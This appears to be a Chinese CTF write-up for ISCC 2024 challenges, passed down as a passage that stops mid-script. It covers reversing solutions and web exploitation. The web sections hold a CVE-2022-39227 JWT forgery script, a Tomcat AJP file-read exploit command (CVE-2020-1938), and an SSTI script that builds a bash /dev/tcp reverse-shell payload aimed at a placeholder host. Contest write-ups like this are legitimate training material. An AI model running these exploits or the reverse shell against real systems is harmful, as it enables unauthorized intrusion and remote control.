<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79a5ef9.png" alt="image-20240525192708644"></p>
<p>发现关键代码</p>
<p>找到密钥、密文</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79a31cc.png" alt="image-20240525192841069"></p>
<p>写个脚本</p>
<ul>
<li>使用 <code>.value</code> 更直接地访问和修改 <code>c_uint32</code> 类型的值。</li>
<li>在循环外部通过列表推导式计算 <code>a2</code>，避免了每次循环都重新计算。</li>
<li>合并了最后的打印部分，使用列表推导式和 <code>join</code> 函数一次性转换并输出所有解码后的字符串</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given array of integers</span></span><br><span class="line">a1 = [</span><br><span class="line">    <span class="number">0xDDA214B5</span>, <span class="number">0xE5AD9DF4</span>, <span class="number">0x6AE4F8FF</span>, <span class="number">0x925B7AF6</span>,</span><br><span class="line">    <span class="number">0xEDCA55A3</span>, <span class="number">0xED3670CA</span>, <span class="number">0xA84E71DA</span>, <span class="number">0x1A910369</span>,</span><br><span class="line">    <span class="number">0x75F6D88B</span>, <span class="number">0xB6BBC257</span>, <span class="number">0xC2CAE77B</span>, <span class="number">0xEFD444CF</span>,</span><br><span class="line">    <span class="number">0x532CCDFB</span>, <span class="number">0xFA8A2260</span>, <span class="number">0xDD6B9924</span>, <span class="number">0xBBCC10E3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize variables</span></span><br><span class="line">decode = []</span><br><span class="line">v5 = c_uint32(<span class="number">0</span>)</span><br><span class="line">times = <span class="number">16</span></span><br><span class="line">delta = <span class="number">0x9E3779B8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process the array in pairs</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a1), <span class="number">2</span>):</span><br><span class="line">    v5.value = delta * <span class="number">16</span></span><br><span class="line">    v1 = c_uint32(a1[j])</span><br><span class="line">    v2 = c_uint32(a1[j+<span class="number">1</span>])</span><br><span class="line">    a2 = [i * (j // <span class="number">2</span> + <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Perform the loop for each pair</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        r8d = c_uint32((v1.value &lt;&lt; <span class="number">5</span>) + a2[<span class="number">2</span>])</span><br><span class="line">        r8d.value ^= (v1.value + v5.value)</span><br><span class="line">        esi = c_uint32((v1.value &gt;&gt; <span class="number">6</span>) + a2[<span class="number">3</span>])</span><br><span class="line">        edi = c_uint32(esi.value)</span><br><span class="line">        edi.value &amp;= r8d.value</span><br><span class="line">        edi.value *= <span class="number">2</span></span><br><span class="line">        v2.value -= r8d.value - edi.value + esi.value</span><br><span class="line"></span><br><span class="line">        esi = c_uint32((v2.value &lt;&lt; <span class="number">5</span>) + a2[<span class="number">0</span>])</span><br><span class="line">        r11d = c_uint32(v2.value + v5.value)</span><br><span class="line">        edi = c_uint32(esi.value)</span><br><span class="line">        edi.value &amp;= r11d.value</span><br><span class="line">        esi.value += r11d.value</span><br><span class="line">        edi.value *= <span class="number">2</span></span><br><span class="line">        esi.value -= edi.value</span><br><span class="line"></span><br><span class="line">        r11d.value = (v2.value &gt;&gt; <span class="number">6</span>) + a2[<span class="number">1</span>]</span><br><span class="line">        r11d.value ^= esi.value</span><br><span class="line">        v1.value -= r11d.value</span><br><span class="line"></span><br><span class="line">        v5.value -= delta</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Append results to the decode list</span></span><br><span class="line">    decode.extend([v1.value, v2.value])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert and print the decoded values</span></span><br><span class="line">decoded_string = <span class="string">&#x27;&#x27;</span>.join(libnum.n2s(i)[::-<span class="number">1</span>].decode() <span class="keyword">for</span> i <span class="keyword">in</span> decode)</span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br></pre></td></tr></table></figure>





<h4 id="国密防线至善之战"><a href="#国密防线至善之战" class="headerlink" title="国密防线至善之战"></a>国密防线至善之战</h4><p>IDA打开看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7965026.png" alt="image-20240525193922871"></p>
<p>有hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7892f25.png" alt="image-20240525194015461"></p>
<p>写个脚本跑一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;D:\\流量\\-20240505.exe&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">0x24390</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(f.read(<span class="number">144</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i*<span class="number">12</span>+j]%<span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;1122112211110011221&quot;</span></span><br><span class="line">i = <span class="number">5</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(s[(i-<span class="number">1</span>)*<span class="number">12</span>+j])[<span class="number">2</span>:].zfill(<span class="number">2</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        i-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(s[(i) * <span class="number">12</span> + j+<span class="number">1</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        j+= <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(s[(i+<span class="number">1</span>) * <span class="number">12</span> + j])[<span class="number">2</span>:].zfill(<span class="number">2</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        i+= <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7986c37.png" alt="image-20240525194321105"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="练武题-2"><a href="#练武题-2" class="headerlink" title="练武题"></a>练武题</h3><h4 id="还没想好名字的塔防游戏"><a href="#还没想好名字的塔防游戏" class="headerlink" title="还没想好名字的塔防游戏"></a>还没想好名字的塔防游戏</h4><blockquote>
<p>这是一个还没想好名字的塔防游戏。<br>备注：<br>（1）Flag格式为ISCC{xxx}，其中xxx共有18位，记得数清楚哦！<br>（2）提示在后边哦！</p>
</blockquote>
<p>游戏题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcd062cb1.png" alt="image-20240502213331114"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccfa42b8.png" alt="image-20240502213443418"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccff1715.png" alt="image-20240502213455867"></p>
<p>应该是js题</p>
<p>照例找JS中的alert()：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc2fcef.png" alt="image-20240502214048580"></p>
<p>根据题目</p>
<p>有18个字符</p>
<p>首页有9个大写字母：</p>
<p>MDWTSGTMM</p>
<p>在js的提示中也有9个大写字母：</p>
<p>WWDSCSUEL</p>
<p>9+9&#x3D;18</p>
<p>猜测flag为：</p>
<p>ISCC{MDWTSGTMMWWDSCSUEL}</p>
<h4 id="Flask中的pin值计算"><a href="#Flask中的pin值计算" class="headerlink" title="Flask中的pin值计算"></a>Flask中的pin值计算</h4><p>给了一个网页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdc84f8.png" alt="image-20240506204251939"></p>
<p>f12中有个提示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccbe9c62.png" alt="image-20240506204335544"></p>
<p> L2dldHVzZXJuYW1l </p>
<p>随波逐流解码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdac27a.png" alt="image-20240506204557750"></p>
<p>&#x2F;getusername</p>
<p>访问：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf64307.png" alt="image-20240506204629461"></p>
<p>海螺 这个好像之前做题见到过 记不得了</p>
<p>随便输一下发现：输入会去除输出中的所有代码块格式 以纯文本格式输出 并且重复一遍username&#x2F;appname得到pincalculate&#x2F;crawler</p>
<p>输出{app.py}得一个路由：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf6c532.png" alt="image-20240506210045436"></p>
<p>&#x2F;crawler 访问：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc3116f.png" alt="image-20240506210140557"></p>
<p>要1s内计算 写脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_expression</span>():</span><br><span class="line">    response = requests.get(<span class="string">&#x27;http://101.200.138.180:10006/get_expression&#x27;</span>) <span class="comment"># 修改[website]为实际网站地址</span></span><br><span class="line">    data = json.loads(response.text)</span><br><span class="line">    expression = data[<span class="string">&#x27;expression&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> expression</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># 解析unicode并计算结果</span></span><br><span class="line">    decoded_expression = urllib.parse.unquote(expression)</span><br><span class="line">    sanitized_expression = decoded_expression.replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    result = <span class="built_in">eval</span>(sanitized_expression)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">expression = fetch_expression()</span><br><span class="line">result = calculate_expression(expression)</span><br><span class="line">req=requests.get(<span class="string">&quot;http://101.200.138.180:10006/crawler?answer=&quot;</span>+<span class="built_in">str</span>(result))</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdbf924.png" alt="image-20240508193418242"></p>
<p>发现uuidnode_mac在&#x2F;woddenfish中 访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce2c1e6.png" alt="image-20240508193550245"></p>
<p>电子木鱼 敲击</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc7ec7d.png" alt="image-20240508193621695"></p>
<p>抓包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd27324.png" alt="image-20240508203558487"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd949ac.png" alt="image-20240508204046763"></p>
<p>这个session应该是jwt加密 我们找找密钥</p>
<p>在源码中发现可疑处：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc86974.png" alt="image-20240508204324227"></p>
<p>密钥可能是<code>ISCC_muyu_2024</code></p>
<p>然后改：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc8bfc0.png" alt="image-20240508210206020"></p>
<p>这样会得到网卡地址和下一关：</p>
<p>{‘gongde’: 2461300743, ‘message’: ‘佛曰：功德圆满。地址02:42:ac:18:00:02:,机器码提示给你了&#x2F;machine_id’}</p>
<p>访问&#x2F;machine_id</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc7bce7.png" alt="image-20240508210356014"></p>
<p>vip奖品：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf03b10.png" alt="image-20240508210438876"></p>
<p>又是jwt</p>
<p>解码发现是ps256加密</p>
<p>是CVE-2022-39227-Python-JWT</p>
<p>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;vip&quot;</span></span><br><span class="line">    fake_payload = base64url_encode(</span><br><span class="line">        (dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="comment"># print(fake_payload)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">originaltoken =<span class="string">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ1NTg2NDgsImlhdCI6MTcxNDU1NTA0OCwianRpIjoiRjMzSnFhLTR3Q3BpV3pjV0ZZSE8xQSIsIm5iZiI6MTcxNDU1NTA0OCwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.S1705RN1AwmC-AlVQxisAMAQXUeeJptacH8yirybmaV5ulcBOxhxOI13QDHdBmA3Iis12WZ61Z6x5Qx8jqecLYR291IPdyrclfRCzh4VPwArS2UYPfWP-dp0mGh-RQDzsFQ4yqgX1M6ArbWtcRpLf9NJqsjdrhJnhSCjAwKOfmpImbDq6A0RYwUxpCylbS7fedSpN14OLId8ZTOJvdtD6vNPTHfG0QWqDdfxhMIJ4K8Cab6G41ltAsrz70DMngUJUT_4ImtjWieM6qpM6OgBT5adzVGtmB1Y6cPlFhlypXHEZcvvZlmRe_FUJ7JysA0eeTOz6ObVQQhVJd0_nFFXNA&quot;</span></span><br><span class="line">topic = topic(originaltoken)</span><br><span class="line"><span class="built_in">print</span>(topic)</span><br></pre></td></tr></table></figure>

<p>jwt伪造 改token</p>
<p>这样会给我们一个session和key</p>
<p>然后就是flasksession伪造supervip</p>
<p>直接打到machine-id </p>
<p>然后找个 werkzeug2.0.x ⾼版本算pin脚本 算出来&#x2F;console 填写就有flag</p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>进入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcced1760.png" alt="image-20240520224926175">使用这个接口&#x2F;geneSign?param&#x3D;flag.txtread生成一个secert_key</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce006c1.png" alt="image-20240525125859430"></p>
<p>利用这个key 直接post 读文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd4d7db.png" alt="image-20240525001524308"></p>
<h4 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h4><p>进来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd1f9e8.png" alt="image-20240524233516594"></p>
<p>F12有hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd11d63.png" alt="image-20240524233620172"></p>
<p>熊曰解码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd31e0f.png" alt="image-20240524233829166"></p>
<p>页面输入克制属性(冰)后可以进入success.html</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd64ca6.png" alt="image-20240524234007190"></p>
<p>许愿flag 拿到hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc1d46d.png" alt="image-20240524234110046"></p>
<p>访问试下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc3bb5b.png" alt="image-20240524234147523"></p>
<p>明显是假的</p>
<p>最后是CVE-2020-1938</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 CNVD-<span class="number">2020</span>-<span class="number">10487</span>-Tomcat-Ajp-lfi.py <span class="number">101.200</span><span class="number">.138</span><span class="number">.180</span> -p <span class="number">8009</span> -f WEB-INF/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce60392.png" alt="image-20240520225710883"></p>
<h4 id="回来吧永远的神"><a href="#回来吧永远的神" class="headerlink" title="回来吧永远的神"></a>回来吧永远的神</h4><p>进来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0a9b2ab44.png" alt="image-20240523172119669"></p>
<p>f12看到hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc696a8.png" alt="image-20240523172154020"></p>
<p>提交答案 进入隐藏关卡</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce67dc4.png" alt="image-20240523172324998"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcccc3895.png" alt="image-20240523172442083"></p>
<p>在源码中发现了integrity属性 base64解码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcccd008a.png" alt="image-20240523173048724"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc9a874.png" alt="image-20240523173154099"></p>
<p>隐藏关卡可能是SSTI</p>
<p>试下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd29e88.png" alt="image-20240523173308191"></p>
<p>直接SSTI反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload  <span class="comment"># 确保这个库存在且可以导入  </span></span><br><span class="line">  </span><br><span class="line">url = <span class="string">&quot;http://101.200.138.180:16356/evlelLL/646979696775616e&quot;</span>  </span><br><span class="line">headers = &#123;&#125;  <span class="comment"># 根据需要定义headers，例如添加User-Agent等  </span></span><br><span class="line">cookies = &#123;  </span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.ZkQrdg.TTUET5iRTAmIfSy5szAO9ZMgkA&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  </span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多  </span></span><br><span class="line">    resp = requests.post(url, headers=headers, cookies=cookies, timeout=<span class="number">10</span>, data=&#123;<span class="string">&quot;iIsGod&quot;</span>: payload&#125;)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;大胆&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(  </span><br><span class="line">        waf, <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&quot;&#x27;</span>  </span><br><span class="line">    )  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span 